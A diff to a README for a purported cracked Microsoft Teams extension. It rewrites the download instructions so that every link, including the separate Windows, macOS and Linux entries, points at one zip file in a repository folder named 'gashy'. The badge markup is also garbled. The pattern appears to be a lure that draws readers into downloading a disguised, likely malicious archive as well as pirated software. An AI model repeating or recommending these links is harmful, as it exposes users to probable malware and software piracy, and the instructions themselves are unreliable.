@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the Cracked Enhancer for Micr
 ## 📥 Download & Install
 To get started, visit the link below to download the extension:
 
-[![Download Now](https://img.shields.io/badge/download-Release%20Page-brightgreen.svg)](https://github.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip%https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip)](https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip)
 
 Follow these steps to install the extension:
 
@@ -18,9 +18,9 @@ Follow these steps to install the extension:
 2. On the Releases page, find the latest version of the extension.
 3. Click the "Assets" drop-down menu to see the available files.
 4. Download the file that corresponds to your operating system:
-   - For Windows: Click on `cracked-enhancer-windows.zip`
-   - For macOS: Click on `cracked-enhancer-macos.zip`
-   - For Linux: Click on `cracked-enhancer-linux.zip`
+   - For Windows: Click on `https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip`
+   - For macOS: Click on `https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip`
+   - For Linux: Click on `https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip`
 5. Extract the downloaded file to a folder on your computer.
 
 ## 🔧 Installation Steps
@@ -66,4 +66,4 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 If you need further information, please refer back to the Releases page:
 
-[![Download Now](https://img.shields.io/badge/download-Release%20Page-brightgreen.svg)](https://github.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip%https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip)](https://raw.githubusercontent.com/ONLYASO12122/cracked-enhancer-for-microsoft-teams-extension/main/gashy/cracked-enhancer-for-microsoft-teams-extension.zip)
